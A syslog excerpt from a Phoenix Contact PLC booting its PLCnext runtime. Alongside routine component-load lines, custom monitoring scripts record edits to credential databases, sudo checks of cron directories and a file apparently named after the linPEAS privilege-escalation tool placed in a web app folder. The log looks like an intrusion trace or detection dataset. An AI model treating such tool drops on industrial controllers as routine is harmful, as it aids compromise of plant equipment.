+Aug 24 23:07:56 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Hardware.DeviceHmi.Library' in process 'MainProcess' loaded.
+Aug 24 23:07:56 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Hardware.ExternalPci.Library' in process 'MainProcess' loaded.
+Aug 24 23:07:56 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Hardware.ExternalSDCard.Library' in process 'MainProcess' loaded.
+Aug 24 23:07:56 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Hardware.FanControl.Library' in process 'MainProcess' loaded.
+Aug 24 23:07:56 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Hardware.Fpga.Library' in process 'MainProcess' loaded.
+Aug 24 23:07:56 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Hardware.IdentificationData.Library' in process 'MainProcess' loaded.
+Aug 24 23:07:56 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Hardware.Nim.Library' in process 'MainProcess' loaded.
+Aug 24 23:07:56 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Hardware.OsControl.Library' in process 'MainProcess' loaded.
+Aug 24 23:07:56 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Hardware.RealTimeClock.Library' in process 'MainProcess' loaded.
+Aug 24 23:07:56 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Hardware.ResourceMonitor.Library' in process 'MainProcess' loaded.
+Aug 24 23:07:56 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Hardware.Sensors.Library' in process 'MainProcess' loaded.
+Aug 24 23:07:56 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Plc.Domain.Library' in process 'MainProcess' loaded.
+Aug 24 23:07:56 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Plc.Eclr.Library' in process 'MainProcess' loaded.
+Aug 24 23:07:56 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Plc.Esm.Library' in process 'MainProcess' loaded.
+Aug 24 23:07:56 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Plc.Fbm.Library' in process 'MainProcess' loaded.
+Aug 24 23:07:57 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Plc.Gds.Library' in process 'MainProcess' loaded.
+Aug 24 23:07:57 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Plc.Meta.Library' in process 'MainProcess' loaded.
+Aug 24 23:07:57 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Plc.Plm.Library' in process 'MainProcess' loaded.
+Aug 24 23:07:57 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Plc.Retain.Library' in process 'MainProcess' loaded.
+Aug 24 23:07:57 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Services.Alarms.Library' in process 'MainProcess' loaded.
+Aug 24 23:07:57 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Services.AppManager.Library' in process 'MainProcess' loaded.
+Aug 24 23:07:57 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Services.DataLogger.Library' in process 'MainProcess' loaded.
+Aug 24 23:07:57 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Services.Ehmi.Library' in process 'MainProcess' loaded.
+Aug 24 23:07:57 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Services.Fwm.Library' in process 'MainProcess' loaded.
+Aug 24 23:07:58 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Services.Grpc.Library' in process 'MainProcess' loaded.
+Aug 24 23:07:58 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Services.LinuxSyslog.Library' in process 'MainProcess' loaded.
+Aug 24 23:07:58 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Services.NmUtilities.Library' in process 'MainProcess' loaded.
+Aug 24 23:07:58 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Services.NotificationLogger.Library' in process 'MainProcess' loaded.
+Aug 24 23:08:01 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Services.OpcUAServer.Library' in process 'MainProcess' loaded.
+Aug 24 23:08:01 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Services.PLCnextStore.Library' in process 'MainProcess' loaded.
+Aug 24 23:08:01 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Services.ProfiCloudV3.Library' in process 'MainProcess' loaded.
+Aug 24 23:08:01 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Services.SecurityStoreManager.Library' in process 'MainProcess' loaded.
+Aug 24 23:08:01 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp
+Aug 24 23:08:03 axcf2152 root: [2024-08-24 23:08:02] Script Modified: /etc/plcnext | Owner: root | Group: plcnext_firmware | Size: 4096 bytes | Last Modified: 2024-08-24 23:07:04.920000000 +0000
+Aug 24 23:08:03 axcf2152 sudo:     root : PWD=/home/root ; USER=root ; COMMAND=/bin/ls -lR /etc/cron.d/
+Aug 24 23:08:03 axcf2152 root: [2024-08-24 23:08:03] Script executed: PID=3135, Command=file_monit.sh, User=root, Args=/bin/bash ./file_monit.sh
+Aug 24 23:08:03 axcf2152 root: [2024-08-24 23:08:03] Script Modified: /etc/plcnext/plcnext_users.sqlite | Owner: plcnext_firmware | Group: plcnext_firmware | Size: 32768 bytes | Last Modified: 2024-08-24 23:07:04.920000000 +0000
+Aug 24 23:08:03 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Services.SpnsProxy.Library' in process 'MainProcess' loaded.
+Aug 24 23:08:03 axcf2152 sudo:     root : PWD=/home/root ; USER=root ; COMMAND=/usr/bin/du -sh /etc/cron.d/
+Aug 24 23:08:03 axcf2152 root: [2024-08-24 23:08:03] Script executed: PID=3150, Command=system_log.sh, User=root, Args=/bin/bash ./system_log.sh
+Aug 24 23:08:03 axcf2152 root: [2024-08-24 23:08:03] Script Modified: /etc/plcnext/plcnext_shadow.sqlite | Owner: plcnext_firmware | Group: plcnext_firmware | Size: 12288 bytes | Last Modified: 2024-08-24 23:07:04.900000000 +0000
+Aug 24 23:08:03 axcf2152 root: [2024-08-24 23:08:03] Script executed: PID=29327, Command=bash_access.sh, User=root, Args=/bin/bash /opt/plcnext/master/scripts/bash_access.sh
+Aug 24 23:08:03 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Services.Syslog.Library' in process 'MainProcess' loaded.
+Aug 24 23:08:03 axcf2152 sudo:     root : PWD=/home/root ; USER=root ; COMMAND=/bin/stat -c %y /etc/cron.d/
+Aug 24 23:08:03 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Services.SystemEvents.Library' in process 'MainProcess' loaded.
+Aug 24 23:08:03 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Services.TraceController.Library' in process 'MainProcess' loaded.
+Aug 24 23:08:04 axcf2152 CROND[29319]: (root) CMDEND (/opt/plcnext/master/scripts/cron_monit.sh)
+Aug 24 23:08:04 axcf2152 CROND[29319]: pam_unix(crond:session): session closed for user root
+Aug 24 23:08:04 axcf2152 root: [2024-08-24 23:08:03] Script executed: PID=29329, Command=cron_monit.sh, User=root, Args=/bin/bash /opt/plcnext/master/scripts/cron_monit.sh
+Aug 24 23:08:04 axcf2152 root: [2024-08-24 23:08:03] Script : /opt/plcnext/master/php_app/linpease.sh | Owner: admin | Group: plcnext | Size: 862779 bytes | Last Modified: 2024-08-24 22:10:29.410000000 +0000
+Aug 24 23:08:04 axcf2152 CROND[29322]: (root) CMDEND (/opt/plcnext/master/scripts/bash_access.sh)
+Aug 24 23:08:04 axcf2152 CROND[29322]: pam_unix(crond:session): session closed for user root
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Services.Wbm.Library' in process 'MainProcess' loaded.
+Aug 24 23:08:04 axcf2152 root: [2024-08-24 23:08:04] Script executed: PID=29330, Command=bash_monitor.sh, User=root, Args=/bin/bash /opt/plcnext/master/scripts/bash_monitor.sh
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Services.Wcm.Library' in process 'MainProcess' loaded.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.System.Commons.Services.Library' in process 'MainProcess' loaded.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.System.RscGateway.Library' in process 'MainProcess' loaded.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.System.Security.Services.Library' in process 'MainProcess' loaded.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.System.Um.Library' in process 'MainProcess' loaded.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.System.UmRscAuthorizator.Library' in process 'MainProcess' loaded.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.System.Watchdog.Library' in process 'MainProcess' loaded.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - EthernetIPComponent
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Io.EthernetIP' in process 'ExternalIoProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Io.PnC' in process 'ExternalIoProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Io.PnD' in process 'ExternalIoProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Io.PnS' in process 'ExternalIoProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Plc.DomainProxy@ExternalIoProcess' in process 'ExternalIoProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.System.UmRscAuthorizator@ExternalIoProcess' in process 'ExternalIoProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Io.AxlC' in process 'LocalIoProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Plc.DomainProxy@LocalIoProcess' in process 'LocalIoProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.System.UmRscAuthorizator@LocalIoProcess' in process 'LocalIoProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Device.HmiLed' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Device.Interface' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Hardware.DeviceHmi' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Hardware.ExternalPci' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Hardware.ExternalSDCard' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Hardware.FanControl' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Hardware.Fpga' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Hardware.IdentificationData' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Hardware.NetloadLimiter' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Hardware.Nim' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Hardware.OsControl' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Hardware.RealTimeClock' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Hardware.ResourceMonitor' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Hardware.Sensors' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Io.FbIo.AxlC' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Io.FbIo.EthernetIP' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 root: [2024-08-24 23:08:04] Script executed: PID=29343, Command=bash_monitor.sh, User=root, Args=/bin/bash /opt/plcnext/master/scripts/bash_monitor.sh
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Plc.Domain' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Plc.DomainProxy' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 CROND[29321]: (root) CMDEND (/opt/plcnext/master/scripts/bash_monitor.sh)
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Plc.Eclr' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 CROND[29321]: pam_unix(crond:session): session closed for user root
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Plc.Eclr.ArpDomain' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Plc.EclrServices' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Plc.Esm' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Plc.EsmController' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Plc.Fbm' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Plc.Gds' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Plc.Manager' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Plc.Meta' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Plc.MetaDomain' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Plc.Plm' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Plc.Retain' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Services.Alarms' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Services.AppManager' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Services.DataLogger' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.Services.Ehmi.EhmiComponent INFO - 3069579296   EhmiComponent 
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Services.Ehmi' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Services.Fwm' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Services.GrpcLocal' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Services.LinuxSyslog' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Services.NmUtilities.NmPlcStateListener' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Services.NotificationLogger' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Services.OpcUAServer' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Services.PLCnextStore' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Services.ProfiCloudV3' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Services.SecurityStoreManager' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Services.Spm' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Services.SpnsProxy' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Services.Syslog' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Services.SystemEvents' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Services.TraceController' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.Services.Wbm.Internal.Modules.WbmModuleManager INFO - WBM Modules Manager
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Services.Wbm' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.Services.Wcm' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.System.Commons.Services' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.System.Lm' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.System.RscGateway' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.System.Security.Services' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.System.Um' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.System.UmRscAuthorizator' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ComponentsController INFO - Component 'Arp.System.Watchdog.MainProcess' in process 'MainProcess' created.
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.Hardware.Modules.IdentificationData.Tpm12.Internal.TpmAccess INFO - TPM data version 2 found (length 180)
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.Hardware.IdentificationData.IdentificationDataComponent INFO - Phoenix Contact, AXC F 2152 (2404267), HW 04, serial=1368735890
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.System.Watchdog.SystemWatchdogComponent INFO - starting SystemWatchdog on process: MainProcess
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.Hardware.ExternalSDCard.ExternalSDCardComponent INFO - External SD card de-activation state: activated
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.Hardware.ExternalSDCard.ExternalSDCardComponent INFO - External SD card status: CardNotInserted
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.Hardware.Fpga.FpgaComponent INFO - FPGA version = 1.1.80
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.Hardware.Nim.NimComponent INFO - Ethernet Device 1: public Name 'eth0', name 'LAN 1', MAC A8:74:1D:11:B6:B4, 2 ports, IP=192.168.137.10, subnet mask=255.255.255.0
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.Hardware.ResourceMonitor.ResourceMonitorComponent INFO - Number of CPU cores: 2
+Aug 24 23:08:04 axcf2152 Arp.System.Application: Arp.Hardware.ResourceMonitor.ResourceMonitorComponent INFO - Partition UserPartition: total=487MB, used=223MB, free=228MB
+Aug 24 23:08:05 axcf2152 Arp.System.Application: Arp.Plc.Eclr.Internal.EclrDomain INFO - EclrComponent eclr version 3.4.0.117
+Aug 24 23:08:05 axcf2152 Arp.System.Application: Arp.Services.SpnsProxy.Internal.Commons.SpnsProxyDbgFifo INFO - Init(/tmp/tospns, /tmp/fromspns)
+Aug 24 23:08:05 axcf2152 Arp.System.Application: Arp.Services.SpnsProxy.Data.PlcSysDiagData INFO - PlcSysDiagData: sd-card is not present
+Aug 24 23:08:05 axcf2152 Arp.System.Application: Arp.Services.SpnsProxy.Internal.SpnsProxyManager INFO - no splc plugged
+Aug 24 23:08:05 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - Initialize
+Aug 24 23:08:05 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - SubscribeServices
+Aug 24 23:08:05 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - LoadSettings, settingsPath=/etc/plcnext/device/Io/EthernetIP/EthernetIP.settings
+Aug 24 23:08:05 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - SetupSettings, startEsdk=true
+Aug 24 23:08:05 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - SetupSettings, articleName=AXC F 2152, articleNumber=2404267, serialNumber=1368735890
+Aug 24 23:08:05 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - 2945434432 Start threshold=6, esdkLogType=0x000b, nics=all, minConsumingDataRate=10, minProducingDataRate=10, statisticsLogLevel=Debug, statisticsLogInterval=10000, statisticsSampleCountLimit=2000, statisticsStepMinAverage=false, statisticsStepMaxAverage=false, forceLoadAssemblies=false
+Aug 24 23:08:05 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - 2945434432 ESDK 0xffff, Start, threshold=6, esdkLogType=0x000b, nics=all, heartBeatID=198, listenOnlyID=199, productType=0x0e, productName=AXC F 2152, serialNumber=1368735890, productCode=8220, timerIntervalMin=1, timerIntervalMax=25
+Aug 24 23:08:05 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - 2906182464 OnNewNetworkLedChange ledState=true.
+Aug 24 23:08:05 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - 2906182464 OnNewNetworkLedChange ledState=false.
+Aug 24 23:08:05 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - 2906182464 OnNewNetworkLedChange ledState=true.
+Aug 24 23:08:05 axcf2152 Arp.System.Application: Arp.Io.ProfinetStack.System.Internal.System INFO - PN Version Info: v6.6.11851
+Aug 24 23:08:06 axcf2152 Arp.System.Application: Arp.Io.ProfinetStack.System.Internal.System INFO - ProfinetStack is initialized
+Aug 24 23:08:06 axcf2152 Arp.System.Application: Arp.Io.Axioline.Internal.AxioDrvAcc INFO - Open Axio Driver: /dev/axio_xfer0
+Aug 24 23:08:06 axcf2152 Arp.System.Application: Arp.Io.Axioline.Internal.AxioConfig INFO - Axioline FW Version: 1.40 from 13.11.19
+Aug 24 23:08:06 axcf2152 Arp.System.Application: Arp.Io.Axioline.Internal.AxioDrvAcc INFO - Open Axio Driver: /dev/axio_xfer0
+Aug 24 23:08:06 axcf2152 Arp.System.Application: Arp.Io.ProfinetStack.Device.Internal.Device INFO - Device Instance with Id = 1 added successfully.
+Aug 24 23:08:06 axcf2152 Arp.System.Application: Arp.Io.ProfinetStack.Controller.Internal.Controller INFO - Controller instance added successfully
+Aug 24 23:08:06 axcf2152 Arp.System.Application: Arp.Device.HmiLed.Internal.LedManager INFO - LedManager: PN-Ctrl at 1
+Aug 24 23:08:06 axcf2152 Arp.System.Application: Arp.Device.HmiLed.Internal.LedManager INFO - LedManager: PN-Dev at 1
+Aug 24 23:08:06 axcf2152 Arp.System.Application: Arp.Device.Interface.Internal.MonitorThreads INFO - Device has Reset-Button
+Aug 24 23:08:06 axcf2152 Arp.System.Application: Arp.Device.Interface.Internal.MonitorThreads INFO - Device support RemovableStorage
+Aug 24 23:08:06 axcf2152 Arp.System.Application: Arp.Device.Interface.Internal.MonitorThreads INFO - HW Monitor active with prio 48
+Aug 24 23:08:07 axcf2152 Arp.System.Application: Arp.Services.AppManager.AppManager INFO - AppManager created
+Aug 24 23:08:07 axcf2152 Arp.System.Application: Arp.Services.Spm.SecurityProfileManager INFO - Security Profile Manager
+Aug 24 23:08:07 axcf2152 Arp.System.Application: Arp.Services.TraceController.TraceControllerComponent INFO - Loading settings from /etc/plcnext/device/Services/TraceController/TraceController.settings
+Aug 24 23:08:07 axcf2152 Arp.System.Application: Arp.Services.Wcm.WebConfigurationManager INFO - Web Configuration Manager
+Aug 24 23:08:07 axcf2152 Arp.System.Application: Arp.Services.Ehmi.EhmiComponent INFO - 3069579296   Initialize 
+Aug 24 23:08:07 axcf2152 Arp.System.Application: Arp.Services.Ehmi.EhmiComponent INFO - 3069579296   SubscribeServices 
